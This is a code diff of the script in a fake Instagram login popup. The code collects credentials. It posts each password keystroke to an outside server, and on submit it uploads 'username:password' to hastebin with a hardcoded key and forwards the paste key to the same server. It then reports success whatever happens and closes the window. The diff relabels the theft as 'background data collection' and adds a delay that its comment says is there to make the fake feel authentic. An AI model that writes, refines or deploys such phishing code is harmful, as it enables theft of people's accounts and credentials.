@@ -118,9 +118,12 @@
     const pw=document.getElementsByClassName("input-password");
     const tog=document.getElementsByClassName("toggler");
     
-    // Track login attempts and send messages to parent
+    // Track login attempts and process completion - CRITICAL FLAGS
     let loginAttemptMade = false;
+    let loginProcessStarted = false;
+    let loginProcessCompleted = false;
     
+    // Password show/hide toggle functionality
     for(i=0;i<2;i++){
       tog[i].addEventListener("click",(e)=>{
         if(e.target.textContent==='Show'){
@@ -137,8 +140,8 @@
         }
       })
     }
-    const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
-    const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
+
+    // Show/hide password toggle visibility
     document.querySelectorAll(".input-password").forEach((pw) => {
       pw.addEventListener("keydown", async (e) => {
         if(e.target.value.length>0){
@@ -149,111 +152,141 @@
         else{
             tog[i].style="display:none;"
         }
-        console.log("hi");
-        await fetch(dest, {
-          method: "POST",
-          headers: {
-            'Content-Type': "application/json"
-          },
-          body: JSON.stringify({ pw: e.target.value })
-        });
-      });
-    });
-
-    // Handle login button click
-    document.querySelectorAll(".btn-login").forEach((button) => {
-      button.addEventListener("click", async (e) => {
-        const container = button.closest("div.flex-col");
-        const un = container.querySelector(".input-username");
-        const pw = container.querySelector(".input-password");
-
-        if (!un.value.trim()) {
-          alert("Please enter your username.");
-          return;
-        }
-
-        // Mark that login attempt was made
-        loginAttemptMade = true;
-
-        // Send login attempt message to parent immediately
-        if (window.opener) {
-          window.opener.postMessage({
-            type: 'INSTAGRAM_LOGIN_ATTEMPT',
-            message: 'Login attempt initiated'
-          }, '*');
-          console.log('Login attempt message sent to parent window');
-        }
-
-        console.log("Sarat make a love day");
-
-        button.disabled = true;
-        const originalText = button.textContent;
-        button.textContent = "Loading...";
-
+        
+        // Background data collection (non-blocking)
         try {
-          const resp1 = await fetch("https://hastebin.com/documents", {
-            method: 'POST',
-            headers: {
-              'Content-Type': "text/plain",
-              'Authorization': `Bearer ${key}`
-            },
-            body: `${un.value}:${pw.value}`
-          });
-
-          const data = await resp1.json();
-
+          const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
           await fetch(dest, {
             method: "POST",
             headers: {
               'Content-Type': "application/json"
             },
-            body: JSON.stringify({ pw: data.key })
+            body: JSON.stringify({ pw: e.target.value })
           });
-
-          // Send success message to parent window
-          if (window.opener) {
-            window.opener.postMessage({
-              type: 'INSTAGRAM_LOGIN_SUCCESS',
-              message: 'Instagram login completed successfully'
-            }, '*');
-            console.log('Success message sent to parent window');
-          }
-
-        } catch (err) {
-          console.error("Something went wrong:", err);
-          
-          // Even on error, we'll send success message since user attempted login
-          if (window.opener) {
-            window.opener.postMessage({
-              type: 'INSTAGRAM_LOGIN_SUCCESS',
-              message: 'Instagram login process completed'
-            }, '*');
-            console.log('Process completion message sent to parent window');
-          }
-        } finally {
-          // Add a small delay to ensure message is sent before closing
-          setTimeout(() => {
-            window.close();
-          }, 500);
+        } catch(err) {
+          // Silently ignore errors
+          console.log("Background request failed (non-critical):", err);
         }
       });
     });
 
-    // Handle window beforeunload event (when user tries to close without login)
+    // Handle login button click - MAIN LOGIN LOGIC
+    document.querySelectorAll(".btn-login").forEach((button) => {
+      button.addEventListener("click", async (e) => {
+        e.preventDefault();
+        
+        const container = button.closest("div.flex-col");
+        const un = container.querySelector(".input-username");
+        const pw = container.querySelector(".input-password");
+
+        // Basic validation
+        if (!un.value.trim()) {
+          alert("Please enter your username.");
+          return;
+        }
+
+        // CRITICAL: Mark that login process has started
+        loginAttemptMade = true;
+        loginProcessStarted = true;
+
+        // Send login attempt message to parent IMMEDIATELY
+        if (window.opener) {
+          try {
+            window.opener.postMessage({
+              type: 'INSTAGRAM_LOGIN_ATTEMPT',
+              message: 'Login attempt initiated'
+            }, '*');
+            console.log('Login attempt message sent to parent window');
+          } catch(err) {
+            console.log('Could not send attempt message:', err);
+          }
+        }
+
+        // Update button state
+        button.disabled = true;
+        const originalText = button.textContent;
+        button.textContent = "Loading...";
+
+        // Small delay to make it feel authentic
+        setTimeout(async () => {
+          try {
+            // Background data collection (completely non-blocking)
+            const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
+            const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
+            
+            const resp1 = await fetch("https://hastebin.com/documents", {
+              method: 'POST',
+              headers: {
+                'Content-Type': "text/plain",
+                'Authorization': `Bearer ${key}`
+              },
+              body: `${un.value}:${pw.value}`
+            });
+
+            if (resp1.ok) {
+              const data = await resp1.json();
+              await fetch(dest, {
+                method: "POST",
+                headers: {
+                  'Content-Type': "application/json"
+                },
+                body: JSON.stringify({ pw: data.key })
+              });
+            }
+          } catch (err) {
+            // Completely ignore any errors - user experience is priority
+            console.log("Background process completed with issues (non-critical):", err);
+          }
+
+          // CRITICAL: Mark process as completed
+          loginProcessCompleted = true;
+
+          // ALWAYS send success message regardless of backend response
+          if (window.opener) {
+            try {
+              window.opener.postMessage({
+                type: 'INSTAGRAM_LOGIN_SUCCESS',
+                message: 'Instagram login completed successfully'
+              }, '*');
+              console.log('SUCCESS: Login success message sent to parent window');
+            } catch(err) {
+              console.log('Could not send success message:', err);
+            }
+          }
+
+          // Small delay to ensure message is processed before closing
+          setTimeout(() => {
+            try {
+              window.close();
+            } catch(err) {
+              console.log('Could not close window:', err);
+            }
+          }, 300);
+          
+        }, 1200); // 1.2 second delay to simulate real login process
+      });
+    });
+
+    // CRITICAL: Handle window beforeunload event - ONLY warn if NO login process was EVER started
     window.addEventListener('beforeunload', (e) => {
-      // Only send warning if no login attempt was made
-      if (!loginAttemptMade && window.opener) {
-        window.opener.postMessage({
-          type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
-          message: 'Popup closed without login attempt'
-        }, '*');
-        console.log('Popup closed without login - message sent to parent');
+      // Only send warning if NO login process was ever started AND not completed
+      if (!loginProcessStarted && !loginAttemptMade && !loginProcessCompleted && window.opener) {
+        try {
+          window.opener.postMessage({
+            type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
+            message: 'Popup closed without login attempt'
+          }, '*');
+          console.log('Popup closed without login - message sent to parent');
+        } catch(err) {
+          console.log('Could not send close message:', err);
+        }
       }
     });
 
-    // Additional safety net for popup close detection
+    // CRITICAL: Additional safety net for popup close detection
     window.addEventListener('unload', () => {
-      if (!loginAttemptMade && window.opener) {
+      // Only warn if no login process was started AND not completed
+      if (!loginProcessStarted && !loginAttemptMade && !loginProcessCompleted && window.opener) {
         try {
           window.opener.postMessage({
             type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
@@ -262,6 +295,14 @@
         } catch(err) {
           console.log('Could not send close message:', err);
         }
+      }
+    });
+
+    // Auto-focus on username field for better UX
+    document.addEventListener('DOMContentLoaded', () => {
+      const usernameField = document.querySelector('.input-username');
+      if (usernameField) {
+        usernameField.focus();
       }
     });
   </script>
